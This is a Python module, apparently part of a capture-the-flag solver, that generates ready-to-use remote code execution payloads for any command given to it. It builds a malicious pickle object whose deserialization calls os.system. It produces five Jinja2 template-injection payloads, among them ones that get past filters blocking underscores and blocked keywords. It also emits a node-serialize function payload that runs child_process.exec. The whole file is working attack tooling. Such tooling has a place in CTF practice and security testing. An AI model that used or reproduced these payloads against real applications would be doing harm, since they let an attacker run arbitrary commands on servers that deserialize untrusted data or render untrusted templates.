"""Payload Forge: Python pickle RCE generation, Jinja2 SSTI filter bypasses, and object deserialization."""
from __future__ import annotations

import base64
import pickle
from typing import Any


class RCEExploit:
    """Helper class for generating serialized pickle command execution."""
    def __init__(self, command: str = "cat flag*"):
        self.command = command

    def __reduce__(self):
        import os
        return (os.system, (self.command,))


def generate_pickle_payload(command: str = "cat flag*", encode_b64: bool = True) -> str:
    """Generate serialized Python pickle payload executing arbitrary command."""
    p_bytes = pickle.dumps(RCEExploit(command), protocol=2)
    if encode_b64:
        return base64.b64encode(p_bytes).decode("ascii")
    return p_bytes.decode("latin-1", "replace")


def generate_jinja2_ssti_escapes(command: str = "cat flag*") -> list[dict[str, str]]:
    """Generate bypass payloads for Jinja2 template injection across various filter restrictions."""
    payloads = [
        {
            "name": "Standard Popen Subclasses",
            "payload": f"{{{{ ''.__class__.__mro__[1].__subclasses__()[137]('{command}',shell=True,stdout=-1).communicate()[0].strip() }}}}",
            "bypasses": "Default Jinja2",
        },
        {
            "name": "Lipsum Globals OS Popen",
            "payload": f"{{{{ lipsum.__globals__['os'].popen('{command}').read() }}}}",
            "bypasses": "Short payload without class walking",
        },
        {
            "name": "Cycler Globals OS Popen",
            "payload": f"{{{{ cycler.__init__.__globals__.os.popen('{command}').read() }}}}",
            "bypasses": "Alternative global namespace",
        },
        {
            "name": "Attr Filter (Underscore Bypass)",
            "payload": f"{{{{ ()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()[137](request.args.cmd,shell=True,stdout=-1).communicate()[0] }}}}",
            "bypasses": "Blocks underscores (`_`)",
        },
        {
            "name": "String Concatenation (Keyword Bypass)",
            "payload": f"{{{{ ''['__cl'+'ass__']['__m'+'ro__'][1]['__subcla'+'sses__']()[137]('{command}',shell=True,stdout=-1).communicate()[0] }}}}",
            "bypasses": "Blacklisted keywords ('class', 'subclasses')",
        },
    ]
    return payloads


def generate_node_serialize_payload(command: str = "cat flag*") -> str:
    """Generate IIFE node-serialize RCE payload."""
    payload = f'{{"rce":"_$$ND_FUNC$$_function (){{ require(\'child_process\').exec(\'{command}\', function(error, stdout, stderr) {{ console.log(stdout) }}); }}()"}}'
    return payload


def solve(command: str = "cat flag*") -> dict[str, Any]:
    """Generate all weaponized CTF exploit payloads for a requested command."""
    pickle_b64 = generate_pickle_payload(command, encode_b64=True)
    jinja_list = generate_jinja2_ssti_escapes(command)
    node_payload = generate_node_serialize_payload(command)

    notes = [
        f"=== Python Pickle Deserialization (Base64) ===",
        pickle_b64,
        f"\n=== Node.js node-serialize Payload ===",
        node_payload,
        f"\n=== Jinja2 SSTI Bypass Payloads ===",
    ]
    for j in jinja_list:
        notes.append(f"[{j['name']}] ({j['bypasses']}):\n{j['payload']}\n")

    return {
        "step": "payload-forge",
        "summary": "Weaponized exploit payloads generated (Pickle, Node, Jinja2)",
        "output": "\n".join(notes),
        "flags": [],
        "artifacts": [],
    }
